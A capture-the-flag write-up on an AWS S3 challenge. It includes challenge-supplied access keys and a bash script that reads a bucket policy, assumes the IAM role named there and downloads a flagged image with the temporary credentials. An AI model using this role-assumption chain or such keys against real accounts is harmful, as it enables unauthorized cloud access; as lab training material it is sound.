# Challenge
There is a bucket full of cat images. One of them contains a flag. Go get it!

Bucket: cats-in-a-bucket

Access Key ID: AKIATZ2X44NMCEQW46PL

Secret Access Key: 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

## Solution

Don't even ask. I'm not well versed in AWS and did it googling a lot. So I'm writing this down just so I can come back copy something when I need it.

```bash
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=AKIATZ2X44NMCEQW46PL
export AWS_SECRET_ACCESS_KEY=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

role=$(aws s3api get-bucket-policy --bucket cats-in-a-bucket | \
       jq '.Policy' | \
       tr -d '\\' | \
       sed 's/^"//g;s/"$//g' | \
       jq -r '.Statement[] | select(.Resource == "arn:aws:s3:::cats-in-a-bucket/cat4.jpg") | .Principal.AWS')

output=$(aws sts assume-role --role-arn $role --role-session-name "MySession");
export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' <<< $output);
export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' <<< $output);
export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' <<< $output); echo $AWS_SECRET_ACCESS_KEY,$AWS_SESSION_TOKEN,$AWS_ACCESS_KEY_ID;
aws sts get-caller-identity;
aws s3 cp s3://cats-in-a-bucket/cat4.jpg cat4.jpg
```

The flag was written in the image.
